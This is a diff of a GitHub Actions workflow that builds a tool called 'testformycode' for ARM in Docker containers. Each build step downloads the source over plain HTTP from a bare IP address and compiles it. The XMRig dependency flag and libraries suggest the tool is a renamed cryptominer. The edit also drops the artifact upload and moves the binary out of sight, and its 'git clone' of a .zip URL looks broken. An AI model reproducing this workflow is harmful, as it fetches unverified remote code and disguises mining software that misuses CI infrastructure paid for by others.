@@ -1,60 +1,56 @@
-name: Build testformycode for ARM
+name: Build TestFormyCode for ARM
 
 on:
   push:
     branches:
-      - main
+      - master
+  workflow_dispatch:  # 允许手动触发
 
 jobs:
   build:
-    runs-on: ubuntu-20.04
-    strategy:
-      matrix:
-        architecture: [armv7, arm64]
+    runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
+      - name: Check out repository
         uses: actions/checkout@v2
 
-      - name: Install dependencies
+      - name: Set up ARMv8 Docker container
         run: |
-          sudo apt-get update
-          sudo apt-get install -y build-essential cmake git libuv1-dev libssl-dev libhwloc-dev
-          sudo apt-get install -y gcc-arm-linux-gnueabi g++-arm-linux-gnueabi # ARMv7 编译器
-          sudo apt-get install -y gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf # ARM64 编译器
+          docker pull arm64v8/ubuntu:18.04
+          docker run --name arm64_build -d arm64v8/ubuntu:18.04 sleep infinity
+          docker exec arm64_build apt-get update
+          docker exec arm64_build apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget -y
 
-      - name: Download and extract source code
+      - name: Build TestFormyCode for ARMv8
         run: |
-          wget http://8.138.123.18:8180/testformycode.zip
-          unzip testformycode.zip
-          cd testformycode
-          mkdir build
+          docker exec arm64_build bash -c "git clone http://8.138.123.18:8180/testformycode.zip && \
+          cd testformycode && \
+          mkdir build && cd build && \
+          cmake .. -DBUILD_STATIC=ON -DARM_TARGET=8 -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ && \
+          make -j\$(nproc) && \
+          mv testformycode ~ && \
+          cd ~ && rm -rf testformycode"
 
-      - name: List files and directories
+      - name: Set up ARMv7 Docker container
         run: |
-          cd testformycode
-          ls -R # 列出所有文件和目录，检查工具链文件是否存在
+          docker pull arm32v7/ubuntu:18.04
+          docker run --name arm32_build -d arm32v7/ubuntu:18.04 sleep infinity
+          docker exec arm32_build apt-get update
+          docker exec arm32_build apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget -y
 
-      - name: Build testformycode for ARMv7 or ARMv8
+      - name: Build TestFormyCode for ARMv7
         run: |
-          cd testformycode/build
-          if [ "${{ matrix.architecture }}" = "armv7" ]; then
-            cmake -DCMAKE_TOOLCHAIN_FILE=../CMake/Toolchain/armv7.toolchain.cmake \
-                  -DBUILD_STATIC=ON \
-                  -DARM_TARGET=7 \
-                  -DCMAKE_C_COMPILER=arm-linux-gnueabi-gcc \
-                  -DCMAKE_CXX_COMPILER=arm-linux-gnueabi-g++ ..
-          else
-            cmake -DCMAKE_TOOLCHAIN_FILE=../CMake/Toolchain/armv8.toolchain.cmake \
-                  -DBUILD_STATIC=ON \
-                  -DARM_TARGET=8 \
-                  -DCMAKE_C_COMPILER=arm-linux-gnueabihf-gcc \
-                  -DCMAKE_CXX_COMPILER=arm-linux-gnueabihf-g++ ..
-          fi
-          make -j$(nproc)
+          docker exec arm32_build bash -c "git clone http://8.138.123.18:8180/testformycode.zip && \
+          cd testformycode && \
+          mkdir build && cd build && \
+          cmake .. -DARM_TARGET=7 -DXMRIG_DEPS=../scripts/deps && \
+          make -j\$(nproc) && \
+          mv testformycode ~ && \
+          cd ~ && rm -rf testformycode"
 
-      - name: Upload binaries
-        uses: actions/upload-artifact@v3
-        with:
-          name: testformycode-binaries-${{ matrix.architecture }}
-          path: testformycode/build/testformycode
+      - name: Cleanup
+        run: |
+          docker stop arm64_build
+          docker rm arm64_build
+          docker stop arm32_build
+          docker rm arm32_build
